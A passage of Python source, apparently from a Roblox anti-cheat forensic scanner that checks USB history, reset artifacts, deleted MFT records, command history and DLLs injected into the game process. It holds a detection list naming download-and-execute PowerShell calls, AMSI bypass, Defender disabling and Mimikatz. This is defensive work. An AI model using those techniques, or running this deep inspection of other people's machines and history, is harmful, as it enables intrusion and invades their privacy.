        sym = "⚠" if e["flagged"] else "✓"
        tag = f"  [{', '.join(e['reasons'])}]" if e["reasons"] else ""
        lines.append(f"  {sym} {e['path']}\n    {e['time']} via {e['source']}{tag}")
    return section("Execution History", lines), flagged_cnt, entries


def scan_drives():
    if not WINDOWS: return section("Drive Detection",["Windows only"]),False,""
    drives_found=[]; lines=[]
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SYSTEM\CurrentControlSet\Enum\USBSTOR",
                           0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        i=0
        while True:
            try:
                device=winreg.EnumKey(key,i)
                dk=winreg.OpenKey(key,device,0,winreg.KEY_READ); j=0
                while True:
                    try:
                        inst=winreg.EnumKey(dk,j)
                        ik=winreg.OpenKey(dk,inst,0,winreg.KEY_READ)
                        try: friendly,_=winreg.QueryValueEx(ik,"FriendlyName")
                        except Exception: friendly=device
                        drives_found.append(friendly)
                        winreg.CloseKey(ik); j+=1
                    except OSError: break
                winreg.CloseKey(dk); i+=1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass
    current_letters=[]
    try:
        import string as _str
        for letter in _str.ascii_uppercase:
            if os.path.exists(f"{letter}:\\"): current_letters.append(f"{letter}:")
    except Exception: pass
    lines.append(f"  Current drives: {', '.join(current_letters) or 'None'}")
    lines.append(f"  USB history: {len(drives_found)} device(s)")
    if drives_found:
        lines.append("")
        for d in drives_found[:20]: lines.append(f"  ► {d}")
    drive_warn = len(drives_found) > 3
    info_str=f"Current: {', '.join(current_letters)} | USB history: {len(drives_found)} devices"
    return section("Drive Detection",lines),drive_warn,info_str


def scan_factory_reset():
    """
    Determines OS install/reset age using MULTIPLE independent signals, since
    relying on the registry InstallDate alone is unreliable:
      - InstallDate can survive certain "Reset this PC" modes unchanged
      - Get-WmiObject (used for BIOS date) was REMOVED in Windows 11 24H2+,
        silently returning nothing on newer machines (looks like a bug, isn't)
    We now cross-check registry InstallDate against the strongest forensic
    artifacts Windows leaves behind from an actual Reset/Refresh operation:
      - C:\\$SysReset\\Logs            (created during "Reset this PC")
      - C:\\Windows\\Panther\\PushButtonReset  (push-button reset logs)
      - C:\\$Windows.~BT / ~WS        (leftover staging folders, if not yet cleaned)
    The MOST RECENT of these timestamps is treated as the authoritative reset
    date and flagged separately from the plain registry InstallDate so a
    mismatch (someone reset, but InstallDate is stale/old) is visible.
    """
    if not WINDOWS:
        return section("Factory Reset / System Age", ["Windows only"]), False, ""
    import subprocess
    resets=[]; install_dt=None; sys_age_days=None

    current="Unknown"
    install_str="Unknown"
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                           0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        prod,_=winreg.QueryValueEx(key,"ProductName")
        build,_=winreg.QueryValueEx(key,"CurrentBuild")
        try: idate,_=winreg.QueryValueEx(key,"InstallDate")
        except: idate=None
        if isinstance(idate,int) and idate>0:
            install_dt=datetime.datetime.fromtimestamp(idate)
            sys_age_days=(datetime.datetime.now()-install_dt).days
            install_str=install_dt.strftime("%Y-%m-%d %H:%M:%S")
        current=str(prod)+" Build "+str(build)+" — Registry InstallDate: "+install_str
        winreg.CloseKey(key)
    except: pass

    # BIOS date — Get-WmiObject was removed on Windows 11 24H2+, so fall back
    # to Get-CimInstance (works on all supported versions) if WMI fails.
    bios_date="Unknown"
    try:
        si=subprocess.STARTUPINFO()
        si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        ps_bios = (
            "$d = $null; "
            "try { $d = (Get-CimInstance -ClassName Win32_BIOS -EA Stop).ReleaseDate } catch {}; "
            "if (-not $d) { try { $d = (Get-WmiObject -Class Win32_BIOS -EA Stop).ReleaseDate } catch {} }; "
            "$d"
        )
        out=subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command", ps_bios],
            capture_output=True,text=True,timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW,startupinfo=si)
        raw=out.stdout.strip()
        if raw:
            # Get-CimInstance returns a real DateTime object as text (e.g. "6/15/2023 12:00:00 AM");
            # Get-WmiObject fallback returns the old WMI string format "20230615000000.000000+000"
            m = re.match(r"(\d{4})(\d{2})(\d{2})", raw)
            if m:
                bios_date = f"{m.group(1)}-{m.group(2)}-{m.group(3)}"
            else:
                m2 = re.match(r"(\d{1,2})/(\d{1,2})/(\d{4})", raw)
                if m2:
                    bios_date = f"{m2.group(3)}-{int(m2.group(1)):02d}-{int(m2.group(2)):02d}"
    except: pass

    # ── Strongest signals: artifacts a "Reset this PC" / push-button reset leaves behind ──
    reset_artifact_dates = []   # list of (label, datetime)

    def _folder_ctime(path):
        try:
            if os.path.exists(path):
                return datetime.datetime.fromtimestamp(os.path.getctime(path))
        except Exception:
            return None
        return None

    artifact_paths = [
        (r"C:\$SysReset\Logs",                "$SysReset\\Logs (Reset this PC log folder)"),
        (r"C:\$SysReset",                     "$SysReset (Reset this PC staging folder)"),
        (r"C:\Windows\Panther\PushButtonReset","Panther\\PushButtonReset (push-button reset logs)"),
        (r"C:\$Windows.~BT",                  "$Windows.~BT (in-place upgrade/reset staging — not yet cleaned)"),
        (r"C:\$Windows.~WS",                  "$Windows.~WS (reset staging — not yet cleaned)"),
    ]
    for path, label in artifact_paths:
        dt = _folder_ctime(path)
        if dt:
            reset_artifact_dates.append((label, dt))
            resets.append(f"{label} — created {dt.strftime('%Y-%m-%d %H:%M:%S')}")

    # setupact.log inside Panther also gets rewritten on every reset/upgrade —
    # use its modified time as a secondary signal if no folder artifacts exist.
    setupact = r"C:\Windows\Panther\setupact.log"
    if not reset_artifact_dates and os.path.exists(setupact):
        try:
            dt = datetime.datetime.fromtimestamp(os.path.getmtime(setupact))
            reset_artifact_dates.append(("Panther\\setupact.log (last modified)", dt))
            resets.append(f"setupact.log last modified {dt.strftime('%Y-%m-%d %H:%M:%S')} — possible setup/reset activity")
        except Exception: pass

    best_reset_dt = None
    best_reset_label = None
    if reset_artifact_dates:
        reset_artifact_dates.sort(key=lambda x: x[1], reverse=True)
        best_reset_label, best_reset_dt = reset_artifact_dates[0]

    mismatch_flag = False
    if best_reset_dt and install_dt:
        # If the strongest reset artifact is meaningfully newer than the
        # registry InstallDate, InstallDate likely did NOT update on reset —
        # flag this so it isn't mistaken for "system is old".
        if (best_reset_dt - install_dt).days > 2:
            mismatch_flag = True

    effective_age_days = sys_age_days
    effective_dt = install_dt
    if best_reset_dt and (not install_dt or best_reset_dt > install_dt):
        effective_age_days = (datetime.datetime.now() - best_reset_dt).days
        effective_dt = best_reset_dt

    age_str=(str(effective_age_days)+" days") if effective_age_days is not None else "Unknown"
    lines=[
        "\n  Current OS              : "+current,
        "  BIOS Date               : "+bios_date,
        "  Registry InstallDate    : "+install_str,
        "  Most reliable reset evidence: "+(f"{best_reset_label} ({best_reset_dt.strftime('%Y-%m-%d %H:%M:%S')})" if best_reset_dt else "None found"),
        "  Effective system/reset age  : "+age_str,
        "",
    ]
    if mismatch_flag:
        lines.append("  ⚠ MISMATCH: Reset artifacts are newer than registry InstallDate — "
                      "InstallDate did not update on reset. Use the reset evidence date above, not InstallDate.")
    if effective_age_days is not None and effective_age_days<14:
        lines.append("  ⚠ WARNING: Effective system age is only "+str(effective_age_days)+" days — very recent install/reset")
    if resets:
        lines.append("\n  Reset/upgrade artifacts found:")
        for r in resets: lines.append("    > "+r)
    else:
        lines.append("\n  No reset/upgrade artifacts found on disk (or they were fully removed/wiped).")

    reset_text=(current+" | BIOS: "+bios_date+" | Effective age: "+age_str +
                (" | MISMATCH vs InstallDate" if mismatch_flag else ""))
    return section("Factory Reset / System Age",lines),bool(resets or mismatch_flag or (effective_age_days is not None and effective_age_days<14)),reset_text


# ============================================================
#  NTFS RAW-VOLUME RECOVERY  (pre-reset deleted file evidence)
# ============================================================
#
# When someone factory-resets / reinstalls Windows to destroy evidence,
# "Reset this PC" (Keep my files OR Remove everything, WITHOUT choosing
# "clean the drive thoroughly") does NOT erase file contents — it only
# removes directory entries. The NTFS Master File Table (MFT) keeps the
# old file records as "orphaned" (not-in-use) entries until something else
# overwrites that space. This scanner reads the raw NTFS volume directly
# (same technique used by tools like Recuva/PhotoRec) and looks ONLY for
# orphaned MFT records whose FILENAME matches a cheat keyword — it does
# NOT recover or report on unrelated/personal files.
#
# Requires: Windows, Administrator (already elevated at script start),
# and an NTFS system volume. If a full "clean the drive" wipe was performed,
# this will correctly find nothing — which is itself useful information.
# ============================================================

def _ntfs_open_volume(drive_letter):
    if not WINDOWS: return None
    try:
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x1
        FILE_SHARE_WRITE = 0x2
        OPEN_EXISTING = 3
        path = f"\\\\.\\{drive_letter}:"
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.CreateFileW(path, GENERIC_READ,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                                       None, OPEN_EXISTING, 0, None)
        if not handle or handle == -1:
            return None
        return handle
    except Exception:
        return None


def _ntfs_read(handle, offset, length):
    try:
        kernel32 = ctypes.windll.kernel32
        new_pos = ctypes.c_longlong(0)
        kernel32.SetFilePointerEx.argtypes = [ctypes.c_void_p, ctypes.c_longlong,
                                               ctypes.POINTER(ctypes.c_longlong), ctypes.c_uint32]
        kernel32.SetFilePointerEx(handle, ctypes.c_longlong(offset), ctypes.byref(new_pos), 0)
        buf = ctypes.create_string_buffer(length)
        bytes_read = ctypes.c_uint32(0)
        ok = kernel32.ReadFile(handle, buf, length, ctypes.byref(bytes_read), None)
        if not ok:
            return b""
        return buf.raw[:bytes_read.value]
    except Exception:
        return b""


def _ntfs_close_volume(handle):
    try: ctypes.windll.kernel32.CloseHandle(handle)
    except Exception: pass


def _ntfs_parse_boot_sector(boot):
    try:
        bytes_per_sector = struct.unpack_from('<H', boot, 0x0B)[0]
        sectors_per_cluster = boot[0x0D]
        if bytes_per_sector <= 0 or sectors_per_cluster <= 0:
            return None
        cluster_size = bytes_per_sector * sectors_per_cluster
        mft_lcn = struct.unpack_from('<q', boot, 0x30)[0]
        crpr = struct.unpack_from('<b', boot, 0x40)[0]
        if crpr > 0:
            mft_record_size = crpr * cluster_size
        else:
            mft_record_size = 1 << (-crpr)
        if mft_record_size <= 0 or mft_record_size > 65536:
            return None
        return {
            "bytes_per_sector": bytes_per_sector,
            "sectors_per_cluster": sectors_per_cluster,
            "cluster_size": cluster_size,
            "mft_lcn": mft_lcn,
            "mft_record_size": mft_record_size,
        }
    except Exception:
        return None


def _ntfs_parse_data_runs(data):
    """Parse an NTFS non-resident attribute data-run list into [(lcn, run_len_clusters), ...]."""
    runs = []
    i = 0
    cur_lcn = 0
    try:
        while i < len(data):
            header = data[i]
            if header == 0: break
            len_size = header & 0x0F
            off_size = (header >> 4) & 0x0F
            i += 1
            if len_size == 0 or i+len_size > len(data): break
            run_len = int.from_bytes(data[i:i+len_size], "little", signed=False)
            i += len_size
            if off_size == 0:
                # sparse run — no physical location
                runs.append((None, run_len))
                continue
            if i+off_size > len(data): break
            lcn_delta = int.from_bytes(data[i:i+off_size], "little", signed=True)
            i += off_size
            cur_lcn += lcn_delta
            runs.append((cur_lcn, run_len))
    except Exception:
        pass
    return runs


def _ntfs_apply_fixup(record, bytes_per_sector):
    try:
        record = bytearray(record)
        usa_offset = struct.unpack_from('<H', record, 4)[0]
        usa_count  = struct.unpack_from('<H', record, 6)[0]
        if usa_offset == 0 or usa_count == 0 or usa_offset+2 > len(record):
            return bytes(record)
        for i in range(1, usa_count):
            sector_end = i * bytes_per_sector
            fixup_pos  = usa_offset + i*2
            if sector_end > len(record) or fixup_pos+2 > len(record): break
            record[sector_end-2:sector_end] = record[fixup_pos:fixup_pos+2]
        return bytes(record)
    except Exception:
        return record


def _ntfs_read_attrs(record):
    """Yield (attr_type, is_nonresident, name_len, content_or_runlist_bytes, real_size) for each attribute."""
    try:
        first_attr_off = struct.unpack_from('<H', record, 0x14)[0]
    except Exception:
        return
    off = first_attr_off
    n = len(record)
    while off + 16 <= n:
        try:
            attr_type = struct.unpack_from('<I', record, off)[0]
            if attr_type == 0xFFFFFFFF: break
            attr_len = struct.unpack_from('<I', record, off+4)[0]
            if attr_len <= 0 or off+attr_len > n: break
            non_resident = record[off+8]
            name_len = record[off+9]
            if non_resident == 0:
                content_size = struct.unpack_from('<I', record, off+0x10)[0]
                content_off  = struct.unpack_from('<H', record, off+0x14)[0]
                content = record[off+content_off: off+content_off+content_size]
                yield (attr_type, False, name_len, content, content_size)
            else:
                real_size = struct.unpack_from('<Q', record, off+0x30)[0]
                runlist_off = struct.unpack_from('<H', record, off+0x20)[0]
                runlist = record[off+runlist_off: off+attr_len]
                yield (attr_type, True, name_len, runlist, real_size)
            off += attr_len
        except Exception:
            break


def _ntfs_parse_filename_attr(content):
    """Parse a $FILE_NAME (0x30) attribute's resident content."""
    try:
        if len(content) < 66: return None
        parent_ref = struct.unpack_from('<Q', content, 0)[0]
        crt_ft = struct.unpack_from('<Q', content, 8)[0]
        mod_ft = struct.unpack_from('<Q', content, 16)[0]
        real_size = struct.unpack_from('<Q', content, 48)[0]
        name_len_chars = content[64]
        namespace = content[65]
        name_bytes = content[66:66+name_len_chars*2]
        name = name_bytes.decode("utf-16-le", errors="ignore")
        return {
            "name": name, "namespace": namespace, "parent_ref": parent_ref,
            "created": filetime_to_dt(crt_ft), "modified": filetime_to_dt(mod_ft),
            "real_size": real_size,
        }
    except Exception:
        return None


def _ntfs_read_runs(handle, runs, cluster_size, max_bytes):
    """Read the cluster runs from the volume, concatenated, capped at max_bytes."""
    out = bytearray()
    for lcn, run_len in runs:
        if lcn is None:
            out += b"\x00" * min(run_len*cluster_size, max_bytes-len(out))
        else:
            remaining = max_bytes - len(out)
            if remaining <= 0: break
            chunk_len = min(run_len*cluster_size, remaining)
            data = _ntfs_read(handle, lcn*cluster_size, chunk_len)
            out += data
            if len(data) < chunk_len: break
        if len(out) >= max_bytes: break
    return bytes(out[:max_bytes])


def scan_mft_deleted_recovery(time_budget_sec=40, max_records=400000, max_recover_bytes=4*1024*1024):
    """
    Scans the raw system-volume MFT for ORPHANED (deleted) file records whose
    filename matches a cheat keyword — evidence that survives even after a
    factory reset / OS reinstall on the same partition, as long as the space
    those records occupied hasn't since been overwritten. Best-effort content
    recovery is attempted for small matching files only.
    """
    if not WINDOWS:
        return section("Pre-Reset Deleted File Recovery", ["Windows only"]), 0, []

    drive_letter = (os.environ.get("SystemDrive","C:")[0] or "C").upper()
    handle = _ntfs_open_volume(drive_letter)
    if not handle:
        lines = ["\n  ✗ Could not open raw volume for direct MFT scan.",
                 "    Requires Administrator privileges and an NTFS volume.",
                 "    (This does not affect any of the other scan results.)"]
        return section("Pre-Reset Deleted File Recovery", lines), 0, []

    findings = []
    try:
        boot_raw = _ntfs_read(handle, 0, 512)
        info = _ntfs_parse_boot_sector(boot_raw) if len(boot_raw) >= 512 else None
        if not info:
            lines = ["\n  ✗ Could not parse NTFS boot sector — volume may not be NTFS."]
            return section("Pre-Reset Deleted File Recovery", lines), 0, []

        cluster_size = info["cluster_size"]
        rec_size = info["mft_record_size"]
        bps = info["bytes_per_sector"]

        # Read $MFT's own first record (always located directly at mft_lcn)
        rec0_raw = _ntfs_read(handle, info["mft_lcn"]*cluster_size, rec_size)
        if rec0_raw[:4] != b"FILE":
            lines = ["\n  ✗ Could not locate $MFT — unexpected volume layout."]
            return section("Pre-Reset Deleted File Recovery", lines), 0, []
        rec0 = _ntfs_apply_fixup(rec0_raw, bps)

        mft_runs = None; mft_real_size = 0
        for attr_type, nonres, name_len, payload, real_size in _ntfs_read_attrs(rec0):
            if attr_type == 0x80 and nonres:   # unnamed $DATA (name_len==0 means unnamed/first $DATA)
                if name_len == 0:
                    mft_runs = _ntfs_parse_data_runs(payload)
                    mft_real_size = real_size
                    break
        if not mft_runs:
            lines = ["\n  ✗ Could not parse $MFT data runs."]
            return section("Pre-Reset Deleted File Recovery", lines), 0, []

        total_records = min(mft_real_size // rec_size, max_records)

        # Build a flat list of (volume_offset, length) byte ranges the MFT occupies,
        # so we can read sequential records even across fragmented runs.
        def mft_byte_ranges():
            for lcn, run_len in mft_runs:
                if lcn is None:
                    continue
                yield (lcn*cluster_size, run_len*cluster_size)

        keyword_lc = [k.lower() for k in KEYWORDS]

        def name_matches(name):
            nl = name.lower()
            if any(fp in nl for fp in FALSE_POSITIVE_PATHS):
                return []
            return [k for k in KEYWORDS if k.lower() in nl]

        start_t = time.time()
        idx = 0
        scanned = 0
        for vol_off, run_byte_len in mft_byte_ranges():
            n_recs_in_run = run_byte_len // rec_size
            for r in range(n_recs_in_run):
                if idx >= total_records: break
                if time.time() - start_t > time_budget_sec: break
                rec_off = vol_off + r*rec_size
                raw = _ntfs_read(handle, rec_off, rec_size)
                idx += 1; scanned += 1
                if len(raw) < rec_size or raw[:4] not in (b"FILE",):
                    continue
                try:
                    flags = struct.unpack_from('<H', raw, 0x16)[0]
                except Exception:
                    continue
                in_use = bool(flags & 0x0001)
                if in_use:
                    continue  # only interested in orphaned/deleted records
                fixed = _ntfs_apply_fixup(raw, bps)
                best_name = None; data_attr = None
                for attr_type, nonres, name_len, payload, real_size in _ntfs_read_attrs(fixed):
                    if attr_type == 0x30 and name_len == 0:  # $FILE_NAME
                        fn = _ntfs_parse_filename_attr(payload)
                        if fn and fn["namespace"] != 2:  # skip pure-DOS short names
                            if not best_name or fn["namespace"] in (1,3):
                                best_name = fn
                    elif attr_type == 0x80 and name_len == 0:  # unnamed $DATA
                        data_attr = (nonres, payload, real_size)
                if not best_name or not best_name.get("name"):
                    continue
                kws = name_matches(best_name["name"])
                if not kws:
                    continue
                entry = {
                    "name": best_name["name"],
                    "keywords": kws,
                    "created": best_name["created"].strftime("%Y-%m-%d %H:%M:%S") if best_name["created"] else "Unknown",
                    "modified": best_name["modified"].strftime("%Y-%m-%d %H:%M:%S") if best_name["modified"] else "Unknown",
                    "real_size": best_name["real_size"],
                    "recovered_path": None,
                    "recovery_note": "Metadata only (content not recovered)",
                }
                # Best-effort content recovery for small files only
                if data_attr and best_name["real_size"] and best_name["real_size"] <= max_recover_bytes:
                    nonres, payload, real_size = data_attr
                    try:
                        content = (payload if not nonres else
                                   _ntfs_read_runs(handle, _ntfs_parse_data_runs(payload),
                                                   cluster_size, real_size))
                        if content:
                            out_dir = os.path.join(os.path.expanduser("~"), "Desktop",
                                                    "zevoraRecovered", "PreReset")
                            os.makedirs(out_dir, exist_ok=True)
                            safe_name = re.sub(r'[\\/:*?"<>|]', "_", best_name["name"])
                            out_path = os.path.join(out_dir, f"{idx}_{safe_name}")
                            with open(out_path, "wb") as fp:
                                fp.write(content)
                            entry["recovered_path"] = out_path
                            entry["recovery_note"] = "Best-effort recovery — verify manually, may be partially overwritten"
                    except Exception:
                        pass
                findings.append(entry)
            if time.time() - start_t > time_budget_sec:
                break
    finally:
        _ntfs_close_volume(handle)

    seen = set(); unique_findings = []
    for f in findings:
        k = (f["name"].lower(), f["real_size"])
        if k not in seen:
            seen.add(k); unique_findings.append(f)

    recovered_count = sum(1 for f in unique_findings if f["recovered_path"])
    lines = [
        f"\n  Drive scanned        : {drive_letter}:",
        f"  Orphaned MFT matches : {len(unique_findings)}",
        f"  Content recovered    : {recovered_count} file(s)",
        "",
        "  NOTE: This finds deleted/cheat-named MFT entries that survive a",
        "  'Reset this PC' (without the 'clean the drive' wipe option) on the",
        "  SAME partition. A thorough disk wipe will correctly show 0 results.",
        "",
    ]
    if unique_findings:
        lines.append("⚠ ORPHANED CHEAT-RELATED FILE RECORDS FOUND:")
        for f in unique_findings:
            lines.append(f"  ✗ {f['name']}  [{', '.join(f['keywords'])}]")
            lines.append(f"    Created : {f['created']}   Modified: {f['modified']}   Size: {f['real_size']}b")
            lines.append(f"    {f['recovery_note']}")
            if f["recovered_path"]:
                lines.append(f"    Recovered to: {f['recovered_path']}")
            lines.append("")
    else:
        lines.append("  ✓ No orphaned cheat-related MFT records found.")
    return section("Pre-Reset Deleted File Recovery", lines), len(unique_findings), unique_findings


# ============================================================
#  CMD / POWERSHELL HISTORY SCAN
# ============================================================

def scan_cmd_history():
    """
    Scans PowerShell ConsoleHost history, Win+R Run MRU, Explorer typed paths,
    and BAT/PS1/CMD/VBS scripts on common user directories.
    Flags commands containing cheat keywords or suspicious PowerShell patterns.
    """
    if not WINDOWS:
        return section("CMD / PowerShell History", ["Windows only"]), 0, []

    hits = []; all_commands = []
    SUSPICIOUS_PATS = [
        "invoke-expression","iex ","downloadstring","webclient",
        "bypass","encodedcommand","-enc ","net.webclient",
        "invoke-webrequest","invoke-restmethod","downloadfile","downloaddata",
        "hidden","noninteractive","disable-defender","set-mppreference",
        "amsibypass","amsi","reflection.assembly","invoke-mimikatz",
        "add-mppreference","disablerealtimemonitoring","frombase64string",
    ]

    # 1. PowerShell ConsoleHost_history.txt (all profiles)
    ps_hist_paths = [
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"),
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"),
    ]
    # Also check each user profile on the machine
    try:
        for profile in glob.glob(r"C:\Users\*"):
            extra = os.path.join(profile, r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if extra not in ps_hist_paths and os.path.exists(extra):
                ps_hist_paths.append(extra)
    except Exception: pass

    for ps_hist_path in ps_hist_paths:
        if not os.path.exists(ps_hist_path): continue
        try:
            with open(ps_hist_path, 'r', encoding='utf-8', errors='ignore') as f:
                commands = f.read().strip().splitlines()
            source_label = f"PS ({os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(ps_hist_path))))}"
            for cmd in reversed(commands[-300:]):
                cmd = cmd.strip()
                if not cmd: continue
                all_commands.append((source_label, cmd))
                kws = matches_keyword(cmd)
                sus = kws or any(p in cmd.lower() for p in SUSPICIOUS_PATS)
                if sus:
                    hits.append({"source": source_label, "cmd": cmd, "keywords": kws})
        except Exception: pass

    # 2. Win+R Run MRU (most recently run commands)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                             0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                name, val, _ = winreg.EnumValue(key, i)
                if name != "MRUList" and isinstance(val, str):
                    cmd = val.rstrip("\\1")
                    all_commands.append(("Run MRU", cmd))
                    kws = matches_keyword(cmd)
                    if kws: hits.append({"source": "Run MRU", "cmd": cmd, "keywords": kws})
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass

    # 3. Explorer address bar typed paths
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
                             0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                name, val, _ = winreg.EnumValue(key, i)
                if isinstance(val, str) and val:
                    all_commands.append(("Explorer Path", val))
                    kws = matches_keyword(val)
                    if kws: hits.append({"source": "Explorer Path", "cmd": val, "keywords": kws})
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass

    # 4. BAT/PS1/CMD/VBS script files in common user paths
    script_hits = []
    scan_dirs = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\AppData\\Local\\Temp"),
    ]
    for sdir in scan_dirs:
        if not os.path.exists(sdir): continue
        try:
            for fname in os.listdir(sdir):
                fl = fname.lower()
                if not any(fl.endswith(e) for e in (".bat", ".ps1", ".cmd", ".vbs", ".js")): continue
                fpath = os.path.join(sdir, fname)
                try:
                    mt = datetime.datetime.fromtimestamp(
                        os.path.getmtime(fpath)).strftime("%Y-%m-%d %H:%M:%S")
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(8000)
                    kws = matches_keyword(fname + " " + content)
                    sus_content = any(p in content.lower() for p in SUSPICIOUS_PATS)
                    if kws or sus_content:
                        ext = os.path.splitext(fname)[1]
                        script_hits.append({"file": fpath, "modified": mt, "keywords": kws,
                                             "preview": content[:300].replace('\n', ' ')})
                        hits.append({"source": f"Script ({ext})", "cmd": fpath, "keywords": kws})
                except Exception: pass
        except Exception: pass

    ps_cmds = [(s, c) for s, c in all_commands if "PS" in s or "PowerShell" in s]
    lines = [
        f"\n  Commands in history : {len(all_commands)}",
        f"  Suspicious flagged  : {len(hits)}",
        f"  Script files found  : {len(script_hits)}",
        "",
    ]
    if hits:
        lines.append("  ⚠ SUSPICIOUS COMMANDS / SCRIPTS:")
        for h in hits:
            lines.append(f"  ✗ [{h['source']}] {h['cmd'][:120]}")
            if h.get('keywords'): lines.append(f"    Keywords: {', '.join(h['keywords'])}")
            lines.append("")
    if ps_cmds:
        lines.append(f"\n  PowerShell History (showing up to 100 of {len(ps_cmds)}):")
        for src, cmd in ps_cmds[:100]:
            is_sus = any(p in cmd.lower() for p in SUSPICIOUS_PATS) or bool(matches_keyword(cmd))
            sym = "⚠" if is_sus else "  "
            lines.append(f"  {sym} {cmd}")
    if script_hits:
        lines.append(f"\n  Script Files on Disk ({len(script_hits)}):")
        for s in script_hits:
            lines.append(f"  ⚠ {s['file']}  ({s['modified']})")
            if s.get('preview'):
                lines.append(f"    {s['preview'][:100].replace(chr(13),'').replace(chr(10),' ')}…")
    if not hits and not all_commands and not script_hits:
        lines.append("  ✓ No suspicious command history found.")
    return section("CMD / PowerShell History", lines), len(hits), hits


# ============================================================
#  PROCESS MEMORY / INJECTION SCAN
# ============================================================

def scan_memory_injection():
    """
    Enumerates modules (DLLs) loaded inside the Roblox process — the primary
    evidence of DLL injection. A cheat loader injects a DLL into the Roblox
    process address space; this scan flags DLLs that are:
      - Not from expected Roblox/Windows/trusted paths
      - Unsigned or fail signature verification
      - Match a cheat keyword

    If Roblox is not running, falls back to scanning ALL process module lists
    for any cheat-named DLL (post-injection artifact in other processes).
    """
    if not WINDOWS:
        return section("Memory / Injection Scan", ["Windows only"]), 0, []

    hits = []; module_list = []; roblox_running = False
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0

    EXPECTED_PATHS = [
        "\\roblox\\", "\\windows\\system32\\", "\\windows\\syswow64\\",
        "\\windows\\winsxs\\", "\\program files\\roblox\\",
        "\\microsoft\\", "\\appdata\\local\\roblox\\", "\\appdata\\local\\temp\\roblox",
    ]

    # Scan Roblox process modules
    ps_mod = r"""
$targets = @("RobloxPlayerBeta","RobloxPlayerLauncher")
foreach ($pname in $targets) {
    $p = Get-Process -Name $pname -EA SilentlyContinue | Select-Object -First 1
    if (-not $p) { continue }
    Write-Output "PROC:$($p.Name)|$($p.Id)"
    try {
        foreach ($m in $p.Modules) {
            try { $sig = (Get-AuthenticodeSignature -LiteralPath $m.FileName -EA Stop).Status }
            catch { $sig = "Unknown" }
            Write-Output "MOD:$($m.ModuleName)|$($m.FileName)|$sig|$($m.ModuleMemorySize)"
        }
    } catch { Write-Output "MODERR:$_" }
}
"""
    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command", ps_mod],
            capture_output=True, text=True, timeout=20,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        cur_proc = None
        for line in out.stdout.strip().splitlines():
            line = line.strip()
            if line.startswith("PROC:"):
                cur_proc = line[5:]; roblox_running = True
            elif line.startswith("MOD:") and cur_proc:
                parts = line[4:].split("|", 3)
                if len(parts) < 2: continue
                mod_name = parts[0]; mod_path = parts[1]
                sig = parts[2] if len(parts) > 2 else "Unknown"
                size = parts[3] if len(parts) > 3 else "?"
                is_expected = any(ep in mod_path.lower() for ep in EXPECTED_PATHS)
                kws = matches_keyword(mod_name + " " + mod_path)
                suspicious = bool(kws) or (not is_expected and sig not in ("Valid",))
                entry = {"proc": cur_proc, "name": mod_name, "path": mod_path,
                         "sig": sig, "size": size, "suspicious": suspicious, "keywords": kws}
                module_list.append(entry)
                if suspicious: hits.append(entry)
    except Exception: pass

    # If Roblox not running, broad scan of all process module lists for cheat names
    if not roblox_running:
        ps_all = r"""
Get-Process | ForEach-Object {
    $pn = $_.Name
    try {
        foreach ($m in $_.Modules) {
            Write-Output "$pn|$($m.ModuleName)|$($m.FileName)"
        }
    } catch {}
} 2>$null
"""
        try:
            out2 = subprocess.run(
                ["powershell","-NoProfile","-NonInteractive","-Command", ps_all],
                capture_output=True, text=True, timeout=20,
                creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
            for line in out2.stdout.strip().splitlines():
                parts = line.strip().split("|", 2)
                if len(parts) < 3: continue
                proc_name, mod_name, mod_path = parts
                kws = matches_keyword(mod_name + " " + mod_path)
                if kws:
                    hits.append({"proc": proc_name, "name": mod_name, "path": mod_path,
                                 "sig": "N/A", "size": "?", "suspicious": True, "keywords": kws})
        except Exception: pass

    lines = [""]
    if not roblox_running:
        lines.append("  ℹ Roblox was NOT running during this scan.")
        lines.append("  Live injection detection is most effective when Roblox is open.")
        lines.append("  For a live screenshare, have the player keep Roblox running.")
        lines.append("")
    else:
        sus_cnt = len([m for m in module_list if m["suspicious"]])
        lines.append(f"  ✓ Roblox process found — {len(module_list)} modules loaded")
        lines.append(f"  {'⚠' if sus_cnt else '✓'} {sus_cnt} suspicious / unexpected module(s)")
        lines.append("")

    if hits:
        lines.append("  ⚠ SUSPICIOUS / INJECTED MODULES DETECTED:")
        for h in hits:
            lines.append(f"  ✗ Process  : {h['proc']}")
            lines.append(f"    Module   : {h['name']}")
